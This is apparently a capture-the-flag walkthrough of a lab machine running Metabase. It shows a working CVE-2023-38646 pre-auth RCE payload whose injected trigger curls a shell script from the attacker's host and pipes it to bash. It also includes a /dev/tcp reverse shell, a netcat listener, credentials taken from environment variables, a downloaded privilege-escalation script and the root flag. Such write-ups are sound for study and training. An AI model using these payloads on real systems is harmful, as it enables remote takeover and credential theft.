## Enumeration

After poking around the website, it leads to a login page from data.analytical.htb/login
The page source of the login page shows the metabase version v0.46.6

After googling there's an exploit CVE-2023-38646
https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646 for more information

According to the link above, it shows that setup-token is visible in the page source
"setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"

Or you can curl the following endpoint to get the setup-token: /api/session/properties

## Foothold

The article also states that there's a code injection we can use by submitting a POST request to the following endpoint: /api/setup/validate

```json
{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {curl,http://10.10.14.59:8001/rev.sh}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```
So what I did was I created a reverse shell file locally

```bash
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.59/4444 0>&1
```

then setting up reverse shell via `nc -lvnp 4444` AND setting up a file server on port 8001 via `python3 -m http.server 8001`
I sent the POST request to http://data.analytical.htb/api/setup/validate which uses our setup-token to validate with the database, calls the "curl" command to reachout to my local fileserver on port 8001 then execute the shell.

```bash
listening on [any] 4444 ...
connect to [10.10.14.59] from (UNKNOWN) [10.10.11.233] 47838
sh: can't access tty; job control turned off
/ $ 
```

## Foothold Enum

After getting access, you see that the user is metabase. Enumerating further, we can see that there's a user credentials in the environmental variable
```bash
/ $ env
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=9049d3b1a151
FC_LANG=en-US
SHLVL=4
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=/bin/sh
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/
MB_DB_FILE=//metabase.db/metabase.db
```

Using these credentials, you can SSH into the user
```bash
$ ssh metalytics@10.10.11.233
The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:15: [hashed name]
    ~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? ye
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.
metalytics@10.10.11.233's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)
```

## Priv Escalation
Ubuntu 22.04.3 LTS Jammy has a PE vulnerability: https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

Setting up another fileserver locally and transferring it to the target host, you get root after running the script
```bash
metalytics@analytics:/tmp$ curl http://10.10.14.59:8001/exploit.sh -o exploit.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   558  100   558    0     0   5984      0 --:--:-- --:--:-- --:--:--  6065
metalytics@analytics:/tmp$ ls
exploit.sh      systemd-private-079d0037a92249b7a766ca91bd6e22ba-ModemManager.service-Sb60iJ    systemd-private-079d0037a92249b7a766ca91bd6e22ba-systemd-resolved.service-gimMDj   vmware-root_429-1849429459
ssh-XXXXyisFSO  systemd-private-079d0037a92249b7a766ca91bd6e22ba-systemd-logind.service-vBokr8  systemd-private-079d0037a92249b7a766ca91bd6e22ba-systemd-timesyncd.service-LEskG2
metalytics@analytics:/tmp$ chmod +x exploit.sh
metalytics@analytics:/tmp$ ./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/tmp# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
root@analytics:/tmp# cd /
root@analytics:/# ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@analytics:/# cd root
root@analytics:/root# ls
root.txt
root@analytics:/root# cat root.txt
c0dfc800b6129842b2f2be487d994d42
``` 
